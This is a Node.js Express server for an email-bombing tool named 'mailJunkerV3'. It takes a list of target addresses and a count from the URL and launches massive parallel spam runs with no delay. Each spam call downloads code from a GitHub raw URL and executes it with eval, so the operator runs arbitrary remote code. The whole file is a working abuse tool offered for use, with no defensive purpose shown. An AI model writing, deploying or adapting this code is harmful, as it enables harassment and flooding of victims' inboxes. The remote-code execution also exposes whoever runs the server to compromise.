var express = require("express");
var axios = require("axios");
var path = require("path");
var {v4: uuidv4} = require("uuid"); // for generating unique session IDs
var maximumThrottleSpeed = 10000;
var app = express();
let stopFlag = false;

function removeElementFromArray(array, elementToRemove) {
    var index = array.indexOf(elementToRemove);
    if (index !== -1) {
        array.splice(index, 1);
    }
    return array;
}

var sessions = {}; // To store data for each session

async function spam(sessionId, theemail) {
    if (stopFlag) {
        console.log("Spam operation stopped.");
        return;
    }
    try {
        var response = await axios.get("https://raw.githubusercontent.com/crazystuffofficial/mailJunkerV3/main/fetchingCommand.txt");
        var code = response.data;
        response = await eval(`(async () => { ${code} })()`);
        sessions[sessionId].num++;
        // console.log(response.data);
    } catch (e) {
        if (sessions[sessionId]) {
            sessions[sessionId].errs++;
            sessions[sessionId].errorMessages.push(e.message);
        } else {
            console.log("ERROR: session " + sessionId + " not found. User probably clicked stop button.");
        }
    }
}

function executeSpam(sessionId, emails, emailCount, emailsToSpam, interval) {
    let spamCount = 0;
    var totalSpams = emailsToSpam * emails.length;
    let startCount = 0;
    var throttleSpeed = Math.min(Math.ceil(Math.sqrt(totalSpams)), maximumThrottleSpeed);
    var intervalId = setInterval(() => {
        if (stopFlag || spamCount >= totalSpams) {
            clearInterval(intervalId);
            console.log("All emails processed.");
            return;
        }
        for(var i = 0; i < throttleSpeed; i++){
            if(startCount < totalSpams){
                spam(sessionId, emails).then(() => {
                    spamCount += emails.length;
                });
                startCount += emails.length;
            }
        }
    }, interval);
}

app.use(express.static("static"));
app.use((req, res, next) => {
    var {
        headers: {
            cookie
        },
    } = req;
    if (cookie) {
        var values = cookie.split(";").reduce((res, item) => {
            var data = item.trim().split("=");
            return {
                ...res,
                [data[0]]: data[1]
            };
        }, {});
        res.locals.cookie = values;
    } else res.locals.cookie = {};
    next();
});

app.get("/sendMail/:id1/:id2/index.html", (req, res) => {
    try {
        var sessionId = uuidv4(); // Generate a unique session ID
        sessions[sessionId] = {
            num: 0,
            errs: 0,
            errorMessages: []
        }; // Initialize session data

        var id1 = Buffer.from(req.params.id1, "base64").toString("utf-8");
        var id2 = Buffer.from(req.params.id2, "base64").toString("utf-8");
        var emails = id1.split(",");
        var emailCount = emails.length;
        var emailsToSpam = Number(id2);

        // Define interval in milliseconds
        var interval = 0; // Example: 1000ms = 1 second

        // Execute the spam function without waiting for it
        executeSpam(sessionId, emails, emailCount, emailsToSpam, interval);

        res.cookie("sessionId", sessionId, {
            httpOnly: true
        }); // Store session ID in a cookie
        res.sendFile(path.join(__dirname, "spamPages", "spam.html"));
    } catch (e) {
        res.status(500).send(
            "Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" +
            e,
        );
    }
});

// Endpoint to stop the spam operation
app.post("/stopSpam", (req, res) => {
    stopFlag = true;
    res.send("Spam operation stopped.");
});

app.post("/cleanUp", (req, res) => {
    var sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        delete sessions[sessionId];
    }
    res.clearCookie("sessionId");
    res.send("Cleared session data.");
});

app.get("/num.txt", (req, res) => {
    var sessionId = res.locals.cookie.sessionId; // Retrieve session ID from cookie
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].num.toString());
    } else {
        res.status(404).send("Session not found");
    }
});

app.get("/errs.txt", (req, res) => {
    var sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].errs.toString());
    } else {
        res.status(404).send("Session not found");
    }
});

app.get("/errmessages.txt", (req, res) => {
    var sessionId = res.locals.cookie.sessionId;
    if (sessions[sessionId]) {
        res.send(sessions[sessionId].errorMessages.join("\n"));
    } else {
        res.status(404).send("Session not found");
    }
});

app.listen(8080, () => {
    console.log("Server is running on port 8080");
});
